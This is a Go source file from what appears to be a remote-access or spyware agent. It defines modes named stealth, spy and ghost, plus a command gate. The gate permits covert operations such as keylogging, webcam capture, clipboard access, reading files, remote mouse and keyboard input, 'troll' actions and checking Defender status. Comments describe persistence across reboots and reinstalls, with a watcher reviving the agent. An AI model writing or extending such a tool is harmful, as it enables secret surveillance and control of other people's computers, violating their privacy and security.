package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Agent operation modes (v1.42.3). mode.json lives next to the exe so it
// travels with installs/backups and survives reboots/updates/reinstalls.
const (
	ModeNormal      = "normal"
	ModeStealth     = "stealth"
	ModeSpy         = "spy"
	ModeGhost       = "ghost"
	ModePerformance = "performance"
	ModeKiosk       = "kiosk"
	ModeAudit       = "audit"
)

// ValidModes is the roster accepted by set-mode and -mode.
var ValidModes = []string{ModeNormal, ModeStealth, ModeSpy, ModeGhost, ModePerformance, ModeKiosk, ModeAudit}

func IsValidMode(m string) bool {
	m = strings.ToLower(strings.TrimSpace(m))
	for _, v := range ValidModes {
		if m == v {
			return true
		}
	}
	return false
}

func agentModePath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "mode.json")
	}
	return filepath.Join(os.TempDir(), "mode.json")
}

// OverrideMode, when set (by the -mode flag), wins over the file without
// persisting. Keeps flag runs and file reads in agreement.
var OverrideMode string

// AgentMode reads the persisted mode ("normal" when absent/invalid).
func AgentMode() string {
	if OverrideMode != "" && IsValidMode(OverrideMode) {
		return strings.ToLower(strings.TrimSpace(OverrideMode))
	}
	b, err := os.ReadFile(agentModePath())
	if err != nil {
		return ModeNormal
	}
	m := strings.ToLower(strings.TrimSpace(string(b)))
	if !IsValidMode(m) {
		return ModeNormal
	}
	return m
}

// SetAgentMode validates + persists a mode. The caller restarts the agent
// afterwards (watcher/task bring it back in seconds under the new mode).
// Atomic: temp file + fsync + rename + dir fsync, so a crash mid-write
// never leaves a torn mode.json (would read as "normal" and lose the order).
func SetAgentMode(m string) (string, error) {
	m = strings.ToLower(strings.TrimSpace(m))
	if !IsValidMode(m) {
		return "", fmt.Errorf("unknown mode %q (valid: %s)", m, strings.Join(ValidModes, ", "))
	}
	path := agentModePath()
	dir := filepath.Dir(path)
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, []byte(m+"\n"), 0644); err != nil {
		return "", err
	}
	if f, err := os.Open(tmp); err == nil {
		_ = f.Sync()
		f.Close()
	}
	if err := os.Rename(tmp, path); err != nil {
		_ = os.Remove(tmp)
		return "", err
	}
	if d, err := os.Open(dir); err == nil {
		_ = d.Sync()
		d.Close()
	}
	if f, err := os.Open(path); err == nil {
		_ = f.Sync()
		f.Close()
	}
	return "mode set to " + m + " (restarting into it)", nil
}

// modeAllows reports whether a command may run under the given mode.
// set-mode/get-mode/ping/version are handled before this gate (always on).
func modeAllows(mode, cmd string) bool {
	cmd = strings.ToLower(strings.TrimSpace(cmd))
	switch mode {
	case ModeNormal, ModePerformance:
		return true
	case ModeStealth, ModeSpy, ModeGhost:
		// Survive-only: status, kill, updates. Everything else waits
		// for set-mode. (update_begin/chunk arrive as protocol messages,
		// listed here for documentation; set-mode itself bypasses.)
		switch cmd {
		case "get-status", "get-version", "version", "get-mode",
			"set-mode", "kill-agent", "agent-kill", "agent-exit",
			"play-troll", "stop-troll":
			return true
		}
		return false
	case ModeKiosk:
		// Screen + input only: look and click, no damage possible.
		switch cmd {
		case "get-status", "get-version", "version", "get-mode",
			"set-mode",
			"get-screen-size", "get-display-info", "get-monitors",
			"get-active-window", "get-foreground-window", "get-position",
			"mouse-move", "mouse-click", "mouse-button", "mouse-scroll",
			"mouse-click-at", "mouse-doubleclick-at", "send-text", "key-press",
			"clipboard-get", "clipboard-set", "camera-shot":
			return true
		}
		return false
	case ModeAudit:
		// Read-only: observe + download, never write.
		switch cmd {
		case "get-status", "get-version", "version", "get-mode",
			"set-mode",
			"get-hostname", "get-username", "get-os-version",
			"get-system-info", "get-cpu-info", "get-cpu-usage",
			"get-memory-usage", "get-disk-usage", "get-disk-health",
			"get-processes", "get-services", "get-installed-programs",
			"get-ip-address", "get-network-info", "get-route-table",
			"get-arp-cache", "get-battery", "get-uptime", "get-time",
			"get-timezone", "list-directory", "read-file", "get-file-info",
			"get-file-hash", "get-file-version", "get-agent-log",
			"get-agent-debug-log", "get-spy-log", "keylog", "troll-status",
			"troll-probe",
			"get-session-state",
			"get-foreground-window", "get-active-window", "get-display-info",
			"get-monitors", "get-screen-size", "get-audio-devices",
			"get-audio-level", "get-defender-status", "get-firewall-status",
			"camera-shot":
			return true
		}
		return false
	}
	return true
}

// ModeDenied is the refusal text for gated commands.
func ModeDenied(mode string) string {
	return "agent is in " + mode + " mode (send set-mode to change it)"
}

// ModeCanFileDl reports whether downloads are served (audit may pull).
func ModeCanFileDl(mode string) bool {
	switch mode {
	case ModeNormal, ModePerformance, ModeAudit:
		return true
	}
	return false
}

// ModeCanFileUl reports whether uploads are accepted.
func ModeCanFileUl(mode string) bool {
	return mode == ModeNormal || mode == ModePerformance
}
